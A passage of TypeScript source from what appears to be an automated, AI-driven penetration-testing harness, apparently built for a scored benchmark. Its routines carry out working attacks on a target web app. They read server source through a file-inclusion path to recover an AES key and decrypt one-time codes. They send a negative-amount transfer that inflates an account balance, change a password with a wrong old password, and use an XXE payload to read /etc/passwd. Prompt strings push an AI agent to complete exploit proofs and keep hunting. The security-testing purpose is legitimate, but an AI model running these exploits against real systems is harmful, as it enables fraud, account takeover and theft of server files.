  fire: (method: string, url: string, headers: Record<string, string>, body: string | null, sess?: string | null, authToken?: string) => Promise<HttpCapture | null>,
  records: RawRecord[], scopeOrigins: string[],
): Promise<ProvedEntry[]> {
  const proved: ProvedEntry[] = [];
  const dbg = (m: string) => { try { console.error(`[f25-probe] ${m}`); } catch { /* ignore */ } };
  const jsonHdr = { "Content-Type": "application/json" };

  // Endpoint URL discovery from records (canonical API origin).
  const urlFor = (re: RegExp) => records.find((r) => re.test(r.request?.url?.toLowerCase() ?? ""))?.request?.url ?? null;
  const jsonBody = (x: RawRecord) => typeof x.request?.body === "string" && x.request.body.trim().startsWith("{");
  // Derive URL and body from the SAME SUCCESSFUL record so they can't mismatch (e.g. a
  // probe's 404 /api/register url paired with a real /api/signup body).
  const signupRec = records.find((x) => /(signup|register)/.test(x.request?.url?.toLowerCase() ?? "") && jsonBody(x) && extractAssignedId(x.response?.body ?? "") !== null);
  const loginRec = records.find((x) => /login/.test(x.request?.url?.toLowerCase() ?? "") && jsonBody(x) && extractJwt(x.response?.body ?? "") !== null);
  const signupTemplate = signupRec?.request?.body ?? null;
  const loginTemplate = loginRec?.request?.body ?? null;
  const signupUrl = signupRec?.request?.url ?? null, loginUrl = loginRec?.request?.url ?? null;
  const payUrl = urlFor(/beneficiary\/pay/), listUrl = urlFor(/beneficiary\/list/);
  const otpGetUrl = urlFor(/otp\/get/), otpVerifyUrl = urlFor(/otp\/verify/), detailsUrl = urlFor(/account\/details/);
  if (!signupTemplate || !loginTemplate || !signupUrl || !loginUrl || !payUrl || !listUrl || !otpGetUrl || !otpVerifyUrl || !detailsUrl) {
    dbg("missing one or more required endpoints/templates — abort"); return proved;
  }

  // Recover the AES OTP key/iv (same crypto intel as F-18). Prefer the API's OWN source via
  // the LFI (/api/show?file=) on the API origin — the OTP model literally contains the
  // openssl_encrypt(key,iv) — since that path is reliably reachable. Fall back to the client
  // SPA bundle's createDecipheriv literals. Both are the target's own shipped code (recon),
  // not a hardcoded answer-key.
  const apiOrigin = new URL(signupUrl).origin;
  let aes: { key: string; iv: string } | null = null;
  const lfiRec = records.find((r) => /\/show\?file=/.test(r.request?.url ?? ""));
  const lfiBase = lfiRec ? (lfiRec.request!.url!.split("?file=")[0]) : `${apiOrigin}/api/show`;
  for (const src of ["api/application/models/Model_otp.php", "application/models/Model_otp.php"]) {
    // file= must carry LITERAL slashes (encoding them to %2F stops the LFI resolving the path).
    const r = await fire("GET", `${lfiBase}?file=${src}`, {}, null, null);
    dbg(`LFI ${src}: status=${r?.response.status} len=${(r?.response.body ?? "").length}`);
    aes = parseAesCbcParams(r?.response.body ?? "");
    if (aes) { dbg(`recovered AES from LFI source ${src}`); break; }
  }
  if (!aes) {
    // Fallback: the client SPA bundle.
    const spaOrigin = scopeOrigins.find((o) => o !== apiOrigin) ?? null;
    if (spaOrigin) {
      const idx = await fire("GET", spaOrigin + "/", {}, null, null);
      let chunk = /\/static\/js\/main\.[a-z0-9]+\.(?:chunk\.)?js/i.exec(idx?.response.body ?? "")?.[0] ?? null;
      if (!chunk) { const man = await fire("GET", spaOrigin + "/asset-manifest.json", {}, null, null); try { chunk = JSON.parse(man?.response.body ?? "{}").files?.["main.js"] ?? null; } catch { /* */ } }
      if (chunk) { const js = await fire("GET", chunk.startsWith("http") ? chunk : spaOrigin + chunk, {}, null, null); aes = parseAesCbcParams(js?.response.body ?? ""); }
    }
  }
  if (!aes) { dbg("could not recover AES params (LFI + SPA) — abort"); return proved; }
  const decOtp = (b64: string): string | null => {
    try {
      const d = createDecipheriv("aes-256-cbc", Buffer.from(aes.key, "utf8"), Buffer.from(aes.iv, "utf8"));
      const out = Buffer.concat([d.update(Buffer.from(b64, "base64")), d.final()]).toString("utf8");
      return out.split("\n")[0].replace(/[^0-9]/g, "") || null;
    } catch { return null; }
  };

  dbg("AES recovered — signing up throwaway payer");
  let signupParsed: unknown;
  try { signupParsed = JSON.parse(signupTemplate); } catch { dbg(`signupTemplate is not JSON (${signupTemplate.slice(0, 40)}) — abort`); return proved; }
  void signupParsed;
  // Signup + login a throwaway payer, device grafted.
  const uniq = randomUUID().replace(/-/g, "").slice(0, 10);
  const P1 = `S${randomUUID().replace(/-/g, "").slice(0, 14)}z9`;
  const build = (tmpl: string, assigns: Array<[string, string]>) => { let o: unknown; try { o = JSON.parse(tmpl); } catch { return tmpl; } for (const [p, v] of assigns) o = setAtPath(o, p, v); return JSON.stringify(o); };
  const sFm = mapFields(jsonStringLeafPaths(JSON.parse(signupTemplate)));
  const sAssign: Array<[string, string]> = [];
  if (sFm.password) sAssign.push([sFm.password, P1]);
  for (const leaf of jsonStringLeafPaths(JSON.parse(signupTemplate))) {
    const k = classifyContactField(leaf.split(".").pop() || leaf);
    if (k === "email") sAssign.push([leaf, `sahw${uniq}@mailinator.com`]);
    else if (k === "mobile") sAssign.push([leaf, `9${Array.from({length:9},()=>Math.floor(Math.random()*10)).join("")}`]);
  }
  const signupBody = build(signupTemplate, sAssign);
  dbg(`signup POST ${signupUrl} bodylen=${signupBody.length}`);
  const sResp = await fire("POST", signupUrl, jsonHdr, signupBody, null).catch((e) => { dbg(`signup fire threw: ${(e as Error)?.message}`); return null; });
  dbg(`signup resp status=${sResp?.response.status ?? "null"}`);
  const P = extractAssignedId(sResp?.response.body);
  if (!P) { dbg(`signup failed (${(sResp?.response.body ?? "").slice(0, 70)})`); return proved; }
  dbg(`payer signed up: ${P}`);
  const goodDevice = findDeviceObject(JSON.parse(signupBody));
  const lFm = mapFields(jsonStringLeafPaths(JSON.parse(loginTemplate)));
  if (!lFm.username || !lFm.password) { dbg("login template missing fields"); return proved; }
  const lResp = await fire("POST", loginUrl, jsonHdr, graftDevice(build(loginTemplate, [[lFm.username, P], [lFm.password, P1]]), goodDevice), null);
  const tok = extractJwt(lResp?.response.body);
  if (!tok) { dbg("payer login failed"); return proved; }
  dbg(`payer ${P} logged in`);

  // Envelope helper for the small data-only requests (device grafted, session token).
  const env = (data: Record<string, string>) => graftDevice(JSON.stringify({ requestBody: { timestamp: "1700000101", device: goodDevice ?? {}, data } }), goodDevice);
  // Return BOTH the numeric balance (for the > comparison) and the RAW string exactly as the
  // response serialized it (for the state_changed field clause, which is string-equality).
  let balPath = "data.accountBalance";
  const balanceOf = async (): Promise<{ cap: HttpCapture | null; bal: number | null; raw: string | null }> => {
    const cap = await fire("POST", detailsUrl, jsonHdr, env({ userid: P }), null, tok);
    let bal: number | null = null; let raw: string | null = null;
    try {
      const d = JSON.parse(cap?.response.body ?? "{}").data;
      if (d?.accountBalance != null) { raw = String(d.accountBalance); balPath = "data.accountBalance"; }
      else if (d?.acctBalance != null) { raw = String(d.acctBalance); balPath = "data.acctBalance"; }
      bal = raw != null ? parseFloat(raw) : null;
    } catch { /* */ }
    return { cap, bal, raw };
  };
  const getOtpRef = async (): Promise<string | null> => {
    const g = await fire("POST", otpGetUrl, jsonHdr, env({ otp_type: "3", userid: P }), null, tok);
    let enc: string | null = null;
    try { enc = JSON.parse(g?.response.body ?? "{}").data?.response ?? null; } catch { /* */ }
    if (!enc) return null;
    const otp = decOtp(enc); if (!otp) return null;
    const v = await fire("POST", otpVerifyUrl, jsonHdr, env({ otp, userid: P }), null, tok);
    try { return JSON.parse(v?.response.body ?? "{}").data?.response ?? null; } catch { return null; }
  };

  // A pre-assigned beneficiary alias.
  const listCap = await fire("POST", listUrl, jsonHdr, env({ userid: P }), null, tok);
  let alias: string | null = null;
  try { const al = JSON.parse(listCap?.response.body ?? "{}").data?.alias; alias = Array.isArray(al) ? al[0] : (typeof al === "string" ? al : null); } catch { /* */ }
  if (!alias) { dbg("no pre-assigned beneficiary alias found"); return proved; }

  const AMT = "5000.00";
  const before = await balanceOf();
  if (before.bal == null) { dbg("could not read balance before"); return proved; }
  const ref1 = await getOtpRef();
  if (!ref1) { dbg("could not obtain otp_ref for the transfer"); return proved; }
  const pay = await fire("POST", payUrl, jsonHdr, env({ alias, amount: `-${AMT}`, otp_response: ref1, remarks: "SahwCheck" }), null, tok);
  const after = await balanceOf();
  dbg(`before=${before.bal} after=${after.bal} pay=${(pay?.response.body ?? "").slice(0, 60)}`);
  if (!pay || after.bal == null || !(after.bal > before.bal)) { dbg("negative transfer did not increase payer balance — no finding"); return proved; }

  // RESTORE: a compensating positive transfer of the same amount back to the beneficiary.
  const ref2 = await getOtpRef();
  const restore = ref2 ? await fire("POST", payUrl, jsonHdr, env({ alias, amount: AMT, otp_response: ref2, remarks: "SahwRestore" }), null, tok) : null;
  const restored = await balanceOf();
  dbg(`restore -> balance=${restored.bal} (${restored.bal != null && Math.abs(restored.bal - before.bal) < 0.01 ? "restored" : "NOT restored"})`);

  const banked = await bankStateChanged(
    opts, "business_logic", payUrl,
    `field:${balPath};from:${before.raw};to:${after.raw}`,
    [before.cap!, pay, after.cap!],
    "negative-amount transfer INCREASED the payer balance (no positivity check in pay_ben)",
    { performed: Boolean(restore), proof: restore ?? undefined },
  );
  if (banked) { proved.push(banked); dbg("F-25 banked (state_changed, reversed)"); }
  else dbg("Axiom did not confirm the balance delta");
  return proved;
}

async function sweepBrokenPasswordChange(
  opts: { obs: SweepObs; engagementId: string; canon: (u: string) => string },
  targets: SweepTargetWithBody[],
  fire: (method: string, url: string, headers: Record<string, string>, body: string | null, sess?: string | null, bearer?: string) => Promise<HttpCapture | null>,
  records: RawRecord[],
): Promise<ProvedEntry[]> {
  const proved: ProvedEntry[] = [];
  const dbg = (m: string) => { try { console.error(`[f24-probe] ${m}`); } catch { /* ignore */ } };

  // Learn KNOWN-GOOD templates from SUCCESSFUL captured exchanges rather than from
  // deriveTargets' single representative (which can be a malformed variant, e.g. a signup
  // using a short/invalid field that the server rejects with SNUP03). A signup whose
  // RESPONSE yields an assigned id, and a login whose RESPONSE carries a JWT, are proven
  // to work against THIS app — the most robust, still-black-box source of a valid envelope.
  const bodyOf = (re: RegExp, ok: (respBody: string) => boolean): string | null => {
    for (const r of records) {
      const u = r.request?.url?.toLowerCase() ?? "";
      const b = r.request?.body;
      if (re.test(u) && typeof b === "string" && b.trim().startsWith("{") && ok(r.response?.body ?? "")) return b;
    }
    return null;
  };
  const signupTemplate = bodyOf(/(signup|register)/, (rb) => extractAssignedId(rb) !== null);
  const loginTemplate = bodyOf(/login/, (rb) => extractJwt(rb) !== null);

  // Change endpoint: its captured field NAMES suffice (we supply the values).
  let changeT: SweepTargetWithBody | undefined; let changeFm: FieldMap | undefined;
  let loginT: SweepTargetWithBody | undefined; let loginFm: FieldMap | undefined;
  for (const t of targets) {
    if (!t.bodyTemplate) continue;
    const fm = mapFields(t.params.filter((p) => t.paramKind[p] === "json"));
    if (!loginT && looksLikeLogin(fm, t.endpoint)) { loginT = t; loginFm = fm; }
    if (!changeT && looksLikePasswordChange(fm, t.endpoint)) { changeT = t; changeFm = fm; }
  }
  // The logout endpoint takes an EMPTY data bag, so deriveTargets drops it (no fuzzable
  // leaves) — find its URL directly from records. CAUTION: an LFI can leave source-file
  // paths like /api/application/controllers/Logout in the store; those return PHP SOURCE,
  // not a logout. Require a real API path (…/logout as a segment, not under /application/)
  // whose RESPONSE is JSON (the real endpoint answers JSON; the source leak answers code).
  const logoutUrl = records.find((r) => {
    const u = r.request?.url?.toLowerCase() ?? "";
    const resp = (r.response?.body ?? "").trimStart();
    return /\/logout(\/|\?|$)/.test(u) && !u.includes("/application/") && resp.startsWith("{");
  })?.request?.url ?? null;
  if (!signupTemplate) { dbg("no successful signup exchange found in records — abort"); return proved; }
  if (!loginTemplate) { dbg("no successful login exchange (JWT) found in records — abort"); return proved; }
  if (!loginT || !loginFm) { dbg("no login target/field-map — abort"); return proved; }
  if (!changeT || !changeFm || !changeFm.new_password) { dbg("no change-password target/new_pass field — abort"); return proved; }

  // Endpoints to send to (canonical), taken from the successful exchanges' own URLs.
  const signupUrl = records.find((r) => /(signup|register)/.test(r.request?.url?.toLowerCase() ?? "") && extractAssignedId(r.response?.body ?? "") !== null)!.request!.url!;
  const loginUrl = records.find((r) => /login/.test(r.request?.url?.toLowerCase() ?? "") && extractJwt(r.response?.body ?? "") !== null)!.request!.url!;

  const jsonHdr = { "Content-Type": "application/json" };
  const buildBody = (template: string, assigns: Array<[string, string]>): string => {
    let obj: unknown;
    try { obj = JSON.parse(template); } catch { return template; }
    for (const [path, val] of assigns) obj = setAtPath(obj, path, val);
    return JSON.stringify(obj);
  };

  // 0) Fresh, unique, policy-valid credentials. Password uses the generic S+hex+z9 shape
  // the framework's disposable creds use (some validators reject special characters).
  const uniq = randomUUID().replace(/-/g, "").slice(0, 10);
  const mkPw = () => `S${randomUUID().replace(/-/g, "").slice(0, 14)}z9`;
  const P1 = mkPw();
  const P2 = mkPw();
  const signupFm = mapFields(jsonStringLeafPaths(JSON.parse(signupTemplate)));
  const assigns: Array<[string, string]> = [];
  if (signupFm.password) assigns.push([signupFm.password, P1]);
  for (const leaf of jsonStringLeafPaths(JSON.parse(signupTemplate))) {
    const kind = classifyContactField(leaf.split(".").pop() || leaf);
    if (kind === "email") assigns.push([leaf, `sahw${uniq}@mailinator.com`]);
    else if (kind === "mobile") assigns.push([leaf, `9${Array.from({length:9},()=>Math.floor(Math.random()*10)).join("")}`]);
  }
  const signupBody = buildBody(signupTemplate, assigns);
  const signupResp = await fire("POST", signupUrl, jsonHdr, signupBody, null);
  const userId = extractAssignedId(signupResp?.response.body);
  if (!userId) { dbg(`signup did not return an assigned id: ${(signupResp?.response.body ?? "").slice(0, 80)}`); return proved; }
  dbg(`signup ok, userId=${userId}`);

  // Login field names from the SUCCESSFUL login template.
  const loginFmGood = mapFields(jsonStringLeafPaths(JSON.parse(loginTemplate)));
  if (!loginFmGood.username || !loginFmGood.password) { dbg("successful login template lacks username/password fields — abort"); return proved; }

  // The signup we just sent succeeded, so its device block is KNOWN-GOOD for this app.
  const goodDevice = findDeviceObject(JSON.parse(signupBody));
  const loginBody = (pw: string) => graftDevice(buildBody(loginTemplate, [[loginFmGood.username!, userId], [loginFmGood.password!, pw]]), goodDevice);

  // pre: login with the not-yet-set P2 -> must fail (no JWT).
  const c0 = await fire("POST", loginUrl, jsonHdr, loginBody(P2), null);
  if (!c0) { dbg("pre-login request failed to capture — abort"); return proved; }
  if (extractJwt(c0.response.body)) { dbg("pre-login with P2 unexpectedly returned a JWT — abort"); return proved; }

  // auth: login with P1 to obtain this account's own token for the change call.
  const authResp = await fire("POST", loginUrl, jsonHdr, loginBody(P1), null);
  const jwt1 = extractJwt(authResp?.response.body);
  if (!jwt1) { dbg(`auth-login with P1 returned no JWT: ${(authResp?.response.body ?? "").slice(0, 80)} — abort`); return proved; }
  dbg("auth-login ok, have JWT1");

  // act: change password with a WRONG old_pass, authenticated as the account itself.
  const changeAssigns: Array<[string, string]> = [[changeFm.new_password!, P2]];
  if (changeFm.old_password) changeAssigns.push([changeFm.old_password, `Swrong99old${randomUUID().slice(0, 4)}z9`]);
  const act = await fire(changeT.method, changeT.endpoint, jsonHdr, graftDevice(buildBody(changeT.bodyTemplate!, changeAssigns), goodDevice), null, jwt1);
  if (!act) { dbg("change request failed to capture — abort"); return proved; }
  dbg(`change resp: ${(act.response.body ?? "").slice(0, 80)}`);

  // This app refuses a second concurrent login ("already logged in" — LGN005) while a
  // session is active, which masks the delta; a logout clears it. Reconstruct a valid
  // logout envelope from the signup body with `data` emptied (a bare body is rejected).
  // The target can return an anomalous response under rapid sequential calls, so retry the
  // logout→post-login a few times: any attempt where the P2 login issues a JWT proves the
  // change committed. Generic, bounded.
  let logoutBody = "{}";
  try { const env = JSON.parse(signupBody); emptyDataInPlace(env); logoutBody = JSON.stringify(env); } catch { /* keep */ }
  let c2: HttpCapture | null = null; let jwt2: string | null = null;
  for (let attempt = 0; attempt < 3 && !jwt2; attempt++) {
    if (logoutUrl) {
      const lo = await fire("POST", logoutUrl, jsonHdr, graftDevice(logoutBody, goodDevice), null, jwt1);
      dbg(`logout attempt ${attempt} resp: ${(lo?.response.body ?? "").slice(0, 50)}`);
    }
    c2 = await fire("POST", loginUrl, jsonHdr, loginBody(P2), null);
    jwt2 = extractJwt(c2?.response.body);
    if (!jwt2) dbg(`post-login attempt ${attempt}: ${(c2?.response.body ?? "").slice(0, 60)}`);
  }
  if (!c2 || !jwt2) { dbg("post-login with P2 never issued a JWT (change rejected or session not cleared)"); return proved; }
  dbg("post-login with P2 SUCCEEDED — banking state_changed");

  const banked = await bankStateChanged(
    opts, "auth_bypass", changeT.endpoint, `appeared:${jwt2}`, [c0, act, c2],
    "password changed with a WRONG old_pass — login with the attacker-set new password now succeeds",
  );
  if (banked) proved.push(banked);
  return proved;
}

/** Whole-body XXE probe (field-injection cannot express an XML external entity). One
 * bounded payload per body-bearing endpoint; returns the exploit + a benign-XML control
 * capture so the caller can verify body_contains the /etc/passwd signature. */
async function sweepXxe(targets: SweepTargetWithBody[], runner: ToolRunner, _sessionLabel?: string): Promise<Array<SweepHit & { exploit?: HttpCapture; control?: HttpCapture }>> {
  const hits: Array<SweepHit & { exploit?: HttpCapture; control?: HttpCapture }> = [];
  // Content-Type variants: some stacks parse XML only under text/xml, others application/xml.
  // Accept: application/xml is the F-21 trigger (the endpoint switches to an XML handler).
  const hdrVariants: Record<string, string>[] = [
    { "Content-Type": "application/xml", Accept: "application/xml" },
    { "Content-Type": "text/xml", Accept: "application/xml" },
  ];
  let n = 0;
  for (const t of targets) {
    if (n >= 50) break;  // cover all derived targets, not just the first few (contactUs sorts late)
    if (t.method !== "POST" && t.method !== "PUT" && t.method !== "PATCH") continue;
    if (!t.bodyTemplate) continue;
    n++;
    // Build the XXE body from THIS endpoint's OWN JSON field names: the app parses XML into
    // the same field elements it expects as JSON and reflects only a field it recognizes,
    // so a generic <x>&xxe;</x> is rejected (CTS002) while <name>&xxe;</name> is echoed.
    const jsonLeaves = t.params.filter((p) => t.paramKind[p] === "json");
    const xml = buildXxeXml(jsonLeaves);
    const benign = buildXxeXml(jsonLeaves).replace(/&xxe;/g, "sahwbenignxml").replace(/<!DOCTYPE[^>]*>/, "");
    // XXE here is UNAUTHENTICATED (F-21 is auth=none, and a session can route the request
    // to a different handler that never parses XML — the likely cause of prior 0/52 runs).
    const mk = (url: string, body: string, hdr: Record<string, string>): Record<string, unknown> =>
      ({ method: t.method, url, headers: hdr, body });
    // Try the canonical route AND its /index variant, across the header variants.
    const urlVariants = [t.endpoint, `${t.endpoint.replace(/\/$/, "")}/index`];
    let exploit: HttpCapture | undefined; let hitUrl = t.endpoint; let hitHdr = hdrVariants[0];
    outer: for (const hdr of hdrVariants) {
      for (const u of urlVariants) {
        const er = await runner.execute("http_request", mk(u, xml, hdr));
        if (!er.ok) continue;
        const cap = er.result as HttpCapture;
        if ((cap.response.body ?? "").includes("root:x:0:0")) { exploit = cap; hitUrl = u; hitHdr = hdr; break outer; }
      }
    }
    if (!exploit) continue;
    const cr = await runner.execute("http_request", mk(hitUrl, benign, hitHdr));
    const control = cr.ok ? (cr.result as HttpCapture) : undefined;
    hits.push({
      vuln_class: "xxe", endpoint: t.endpoint, param: "(xml body)", payload: xml, strength: "strong",
      observed: "root:x:0:0",
      note: "external entity read /etc/passwd; Content-Type application/xml, body_contains the entity content",
      exploit, control,
    });
  }
  return hits;
}

/** Bound a verdict rationale so it stays a compact record field (never a wall of text). */
function boundReason(s: string): string {
  const t = (s ?? "").trim();
  return t.length > 500 ? `${t.slice(0, 500)}…` : t;
}

/**
 * A class's STRONGEST provable invariant + how to COMPLETE the multi-step proof to reach
 * it. Security-domain judgment (like AUTHENTICATED_VULN_CLASSES), NOT the benchmark answer
 * key: for these classes the real proof is the observed EFFECT (a login succeeds, server
 * state moved), and a first-step `body_contains`/`status_in` only proves acceptance. When
 * the loop banks the weaker proof, feedbackForVerdict pushes it to finish the stronger one
 * on the SAME (class, endpoint) — and the dedupe (isInvariantUpgrade) lets it back through.
 * No target hostname/path/value here — the guidance is generic method, not a recipe.
 */
const CLASS_UPGRADE: Record<string, { strong: string; complete: string }> = {
  auth_bypass: {
    strong: "state_changed",
    complete: "You only proved the request was ACCEPTED — that is a PARTIAL result. Now prove the bypass TOOK EFFECT: perform the follow-up action that OBSERVES it (e.g. log in with the changed/attacker-set credential) with ORDERED `steps` ending in that observation, and re-submit the SAME class+endpoint as `state_changed`. Do this BEFORE moving to a different class.",
  },
  business_logic: {
    strong: "state_changed",
    complete: "You only proved the value was ACCEPTED — that is a PARTIAL result. Now prove server STATE MOVED: COMPLETE the operation (satisfy any remaining gate, e.g. supply a VALID one-time code — decrypt it if you recovered the key) and RE-READ the affected state (balance/quota/status) via a follow-up request, then re-submit the SAME class+endpoint as `state_changed` with those ordered `steps`. Do this BEFORE moving on.",
  },
  improper_session_invalidation: {
    strong: "state_violated",
    complete: "Prove the STRONGER invariant: replay the OLD token against an authenticated endpoint AFTER the invalidating action and show it still authenticates; re-submit as `state_violated` before moving on.",
  },
};

/** True when `candidate` is the class's strongest invariant and `banked` was weaker — i.e.
 * a legitimate upgrade of an already-banked partial, which the dedupe must let through. */
export function isInvariantUpgrade(vulnClass: string, banked: string, candidate: string): boolean {
  const u = CLASS_UPGRADE[vulnClass];
  return !!u && candidate === u.strong && banked !== u.strong;
}

export function feedbackForVerdict(
  vuln_class: string, endpoint: string, verdict: string, reason: string,
  cause?: FailureCause, causeDetail?: string | null, invariantType?: string,
): string {
  const parts = [`Verdict for ${vuln_class} @ ${endpoint}: ${verdict} (${reason}).`];
  if (cause) {
    parts.push(`Cause: ${cause} — ${(causeDetail && causeDetail.trim()) || CAUSE_GUIDANCE[cause]}`);
  }
  // FEEDBACK_COMPLETE: a CONFIRMED-but-WEAKER invariant on an upgradable class is only a
  // PARTIAL for scoring — push the loop to finish the stronger multi-step proof on the
  // same target instead of banking-and-moving-on (jev: highest-leverage loop tuning).
  const up = verdict === "CONFIRMED" && invariantType ? CLASS_UPGRADE[vuln_class] : undefined;
  if (up && invariantType !== up.strong) {
    parts.push(up.complete);
    return parts.join(" ");
  }
  parts.push("That pair is now banked — do not report it again this beat.");
  parts.push("Continue hunting: find a DIFFERENT vulnerability class or endpoint.");
  return parts.join(" ");
}

function feedbackForDuplicate(vuln_class: string, endpoint: string): string {
  return [
    `You already reported ${vuln_class} @ ${endpoint} in this beat — that is a`,
    "duplicate, so it was not re-verified. Pick a different vuln_class/endpoint pair.",
  ].join(" ");
}

/** Distinct from feedbackForDuplicate: this is not a rejection of a wrong claim, it
 * is a class the engagement already scored (on ANY endpoint, possibly in a prior
 * beat) — the request was never replayed against the target at all. */
function feedbackForAlreadyProved(vuln_class: string, endpoint: string): string {
  return [
    `${vuln_class} is already CONFIRMED elsewhere in this engagement — the rubric`,
    `scores a class once, so replaying it against ${endpoint} was skipped without`,
    "contacting the target. That is not a rejection: pick a DIFFERENT vulnerability",
    "class you have not yet proved.",
  ].join(" ");
}

function feedbackForMaxTurnsPerFinding(cap: number): string {
  return [
    `You used up this attempt's turn cap (${cap}) without stating a claim.`,
    "Drop that hypothesis and try a different, cheaper vuln_class/endpoint — you",
    "still have budget left in this beat.",
  ].join(" ");
}

function feedbackForInvalidVulnClass(got: unknown): string {
  return [
    `"${String(got)}" is not a valid vuln_class.`,
    `vuln_class MUST be exactly one of: ${VULN_CLASSES.join(", ")}.`,
    "No prose, no parentheses, no capitalisation — re-emit your claim with one of",
    "those exact values.",
  ].join(" ");
}

// ---- Failure-cause taxonomy (Defect 2) -------------------------------------------
//
// A codified mirror of brief.ts's <evidence_discipline> "admissible evidence per
// class" table: which invariant TYPE can actually prove which vuln_class's
// mechanism. Generic vocabulary only (never a target endpoint/param/payload) — see
// the black-box rule. Used ONLY to attribute a failure cause; the Axiom (axiom.ts)
// remains the sole authority on the verdict itself.
const DIFFERENTIAL_ONLY_CLASSES = new Set<VulnClass>([
  "sqli", "xss_reflected", "xss_stored", "xxe", "path_traversal",
  "deserialization_rce", "ssrf", "idor", "business_logic", "auth_bypass",
]);
const ASSERTED_ONLY_CLASSES = new Set<VulnClass>([
  "cors_misconfig", "insecure_transport", "clickjacking", "jwt_weak_key",
  "improper_session_invalidation",
]);
const RATE_LIMIT_CLASSES = new Set<VulnClass>(["rate_limit_absence"]);
const ENUMERATION_CLASSES = new Set<VulnClass>([
  "user_enumeration", "forced_browsing", "disposable_email_accepted", "weak_password_policy",
]);
// Disclosure classes are the ONE exception EVIDENCE_DISCIPLINE names for a static
// asset: "Static assets support only disclosure claims." Also broad on invariant
// type — the sensitive content can show up in the body or a header.
const DISCLOSURE_CLASSES = new Set<VulnClass>(["info_disclosure", "crypto_disclosure"]);

function allowedInvariantTypes(vulnClass: VulnClass): ReadonlySet<InvariantType> {
  if (DIFFERENTIAL_ONLY_CLASSES.has(vulnClass)) return new Set<InvariantType>(["body_contains", "status_in"]);
  if (ASSERTED_ONLY_CLASSES.has(vulnClass)) return new Set<InvariantType>(["response_asserted"]);
  if (RATE_LIMIT_CLASSES.has(vulnClass)) return new Set<InvariantType>(["status_in"]);
  if (ENUMERATION_CLASSES.has(vulnClass)) return new Set<InvariantType>(["status_in", "body_contains"]);
  if (DISCLOSURE_CLASSES.has(vulnClass)) {
    return new Set<InvariantType>(["body_contains", "response_asserted", "status_in"]);
  }
  // Every VulnClass is covered by exactly one of the buckets above — this is a
  // defensive fallback only, never expected to run.
  return new Set<InvariantType>(["body_contains", "status_in", "response_asserted"]);
}

// A conservative content-type sniff for "this is a static asset, not application
// logic" — scripts, stylesheets, images, fonts, binary blobs. Deliberately does NOT
// include text/html or application/json: those are exactly the shapes a dynamic
// endpoint legitimately answers with, so treating them as "static" would make every
// ordinary JSON API response look implausible.
const STATIC_ASSET_CONTENT_TYPE =
  /^(text\/(javascript|css)|application\/(javascript|x-javascript|font[-\w]*|wasm|octet-stream)|image\/|font\/)/i;

function isStaticAssetCapture(capture: HttpCapture | null): boolean {
  if (!capture) return false;
  const ct = headerValueCI(capture.response.headers, "content-type");
  return Boolean(ct) && STATIC_ASSET_CONTENT_TYPE.test(ct as string);
}

/** Recomputes, from the SAME structured facts axiom.ts itself used (the invariant's
 * own expression against the exploit/control responses), whether the differential
 * signal the invariant expects was present in each side — never by reading
 * axiom.ts's prose `reason`. Intentionally a simpler check than axiom.ts's own
 * serializeExchange (body + headers, unsorted) — good enough to ATTRIBUTE a cause;
 * the Axiom's own evaluate() remains the sole source of the actual verdict. */
function computeDifferentialSignal(
  inv: Invariant, exploit: HttpCapture | null, control: HttpCapture | null,
): { markerInExploit: boolean | null; markerInControl: boolean | null } {
  // A null exploit means the exploit request could not be captured at all (see the
  // capture guard in runBeat). There is then no exploit side to compute a signal
  // from — return nulls rather than deref it (this must never throw and abort the
  // beat over one un-capturable claim).
  if (!exploit) return { markerInExploit: null, markerInControl: null };
  if (inv.type === "body_contains") {
    const marker = inv.expression;
    const has = (c: HttpCapture) =>
      c.response.body.includes(marker) || Object.values(c.response.headers).some((v) => v.includes(marker));
    return { markerInExploit: has(exploit), markerInControl: control ? has(control) : null };
  }
  if (inv.type === "status_in") {
    const wanted = inv.expression.split(",").map((s) => Number(s.trim())).filter(Number.isFinite);
    return {
      markerInExploit: wanted.includes(exploit.response.status),
      markerInControl: control ? wanted.includes(control.response.status) : null,
    };
  }
  return { markerInExploit: null, markerInControl: null };
}

/** Deterministic cause attribution for a non-CONFIRMED finding. Returns null for
 * CONFIRMED (no cause needed). Every branch reads only structured facts this module
 * already holds — never axiom.reason's prose. Order matters: a wrong invariant TYPE
 * or an implausible endpoint explain the failure more fundamentally than a
 * downstream marker/control fact, so both are checked first. */
// The four evidence-bundle types (see axiom.ts's EvidenceBundle) prove themselves
// from `evidence.captures` / `evidence.derivedInput`, never a control differential —
// same posture as response_asserted. allowedInvariantTypes()'s per-vuln_class
// buckets predate these types and (correctly, for now) name none of them, so both
// checks below would otherwise misattribute EVERY non-CONFIRMED verdict of these
// types as "wrong_invariant_type" / "no_control" regardless of the REAL reason
// (e.g. too few `steps`). Exempting them here defers to axiom.reason (surfaced to
// the hunter verbatim) rather than emitting a confidently wrong cause label.
const EVIDENCE_BUNDLE_TYPES = new Set<InvariantType>([
  "derived", "state_changed", "state_violated", "file_created_then_deleted",
]);

function classifyFailureCause(facts: {
  axiomStatus: string;
  vulnClass: VulnClass;
  invariantType: InvariantType;
  hasControl: boolean;
  markerInExploit: boolean | null;
  markerInControl: boolean | null;
  endpointIsStaticAsset: boolean;
}): FailureCause | null {
  if (facts.axiomStatus === "CONFIRMED") return null;
  if (!EVIDENCE_BUNDLE_TYPES.has(facts.invariantType)
    && !allowedInvariantTypes(facts.vulnClass).has(facts.invariantType)) return "wrong_invariant_type";
  if (facts.endpointIsStaticAsset && !DISCLOSURE_CLASSES.has(facts.vulnClass)) return "endpoint_implausible";
  if (!facts.hasControl && facts.invariantType !== "response_asserted"
    && !EVIDENCE_BUNDLE_TYPES.has(facts.invariantType)) return "no_control";
  if (facts.markerInExploit === false) return "marker_absent";
  if (facts.markerInExploit === true && facts.markerInControl === true) return "control_shared_marker";
  return "unknown";
}

// ---- Claim review: a mandatory pre-Axiom stage (Defect 1) -------------------------
//
// "Availability is not adoption." skill_run was wired and adversarial-self-review
// permitted, but leaving it to the model's discretion meant it was called once in a
// 31-turn beat — never at the moment it mattered. Maker != checker: the agent that
// writes the claim must not be the agent that approves it. This makes the review a
// stage the ORCHESTRATOR runs, not a tool the hunter may or may not reach for.
//
// The review does NOT replace the Axiom — evaluate() in axiom.ts remains the sole
// deterministic verdict authority. This is a pre-filter: adversarial-self-review is
// designed (see skills/adversarial-self-review/SKILL.md) as the FINAL skeptical gate
// over ALREADY-VERIFIED findings (oracle_verifications, reproduced evidence, ...).
// Run here, BEFORE the Axiom has replayed anything, the only verification pass that
// genuinely exists yet is the hunter's own single observation — the one that produced
